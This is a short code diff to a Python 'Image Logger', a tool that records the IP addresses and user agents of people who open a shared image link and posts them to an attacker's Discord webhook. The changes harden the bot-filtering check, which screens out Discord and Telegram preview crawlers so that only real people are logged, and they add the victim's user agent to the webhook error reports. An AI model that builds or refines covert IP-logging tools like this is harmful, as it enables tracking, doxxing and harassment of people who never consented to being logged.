@@ -69,23 +69,25 @@ blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
-    elif useragent.startswith("TelegramBot"):
+    elif useragent and useragent.startswith("TelegramBot"):  # Ensure useragent is not None
         return "Telegram"
     else:
         return False
 
-def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
+def reportError(error, useragent=None):
+    requests.post(config["webhook"], json={
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [
+            {
+                "title": "Image Logger - Error",
+                "color": config["color"],
+                "description": f"An error occurred while trying to log an IP!\n\n"
+                               f"**Error:**\n```\n{error}\n```\n"
+                               f"**Retrieved User-Agent:** `{useragent}`"
+            }
+        ],
+    })
 
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
